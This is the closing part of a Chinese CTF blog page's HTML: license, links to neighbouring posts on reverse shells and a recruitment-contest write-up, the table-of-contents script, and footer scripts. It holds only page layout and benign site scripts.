+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/02/12/%5BSUCTF2019%5D%20ezphp/" property="cc:attributionName"
+               rel="cc:attributionURL">
+                Z3ratu1
+            </a> is licensed under a
+            <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">
+                Creative Commons Attribution 4.0 International License
+            </a> 
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2020/02/14/%E5%8F%8D%E5%BC%B9shell/">
+                    <div class="card-image">
+                        
+                        <img src="/img/note.jpg" class="responsive-img" alt="反弹shell入门">
+                        
+                        <span class="card-title">反弹shell入门</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            反弹shell入门起源于今天AA师傅的一个简单web，但是由于对反弹shell的一无所知和对某些知识的偏差认识浪费了一个下午没做出来反弹shell需要对标准输入输出流重定向有一点基础的理解，大致原理不在赘述，只是做个记录
+上很简单的源码
+&
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-14
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%AC%94%E8%AE%B0/" class="post-category" target="_blank">
+                                    笔记
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%8F%8D%E5%BC%B9shell/" target="_blank">
+                        <span class="chip bg-color">反弹shell</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/12/10/%E4%B8%89%E5%8F%B6%E8%8D%89%E6%8B%9B%E6%96%B0%E8%B5%9B/">
+                    <div class="card-image">
+                        
+                        <img src="/img/1.jpg" class="responsive-img" alt="三叶草招新赛部分wp">
+                        
+                        <span class="card-title">三叶草招新赛部分wp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            三叶草招新赛部分wp最近是三叶草招新，不愧是强队，招新赛都这么难，学习了QWQ
+性感黄阿姨在线聊天打开是一个对话框，输入表情包可以获得三叶草师傅们的表情包（没有什么实际意义）题目分两层，一层PHP弱类型一层XXE（xml实体注入）
+弱类型比
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-12-10
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-category" target="_blank">
+                                    刷题记录
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/xxe/" target="_blank">
+                        <span class="chip bg-color">xxe</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            
+            &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">44.6k</span>&nbsp;字
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="fa fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fa fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            <br>
+            <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+            <script>
+                var now = new Date();
+
+                function createtime() {
+                    var grt = new Date("06/28/2019 00:00:00");
+                    now.setTime(now.getTime() + 250);
+                    days = (now - grt) / 1000 / 60 / 60 / 24;
+                    dnum = Math.floor(days);
+                    hours = (now - grt) / 1000 / 60 / 60 - (24 * dnum);
+                    hnum = Math.floor(hours);
+                    if (String(hnum).length == 1) {
+                        hnum = "0" + hnum;
+                    }
+                    minutes = (now - grt) / 1000 / 60 - (24 * 60 * dnum) - (60 * hnum);
+                    mnum = Math.floor(minutes);
+                    if (String(mnum).length == 1) {
+                        mnum = "0" + mnum;
+                    }
+                    seconds = (now - grt) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+                    snum = Math.round(seconds);
+                    if (String(snum).length == 1) {
+                        snum = "0" + snum;
+                    }
+                    document.getElementById("timeDate").innerHTML = "本站已安全运行 " + dnum + " 天 ";
+                    document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+                }
+                setInterval("createtime()", 250);
+            </script>
+            
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
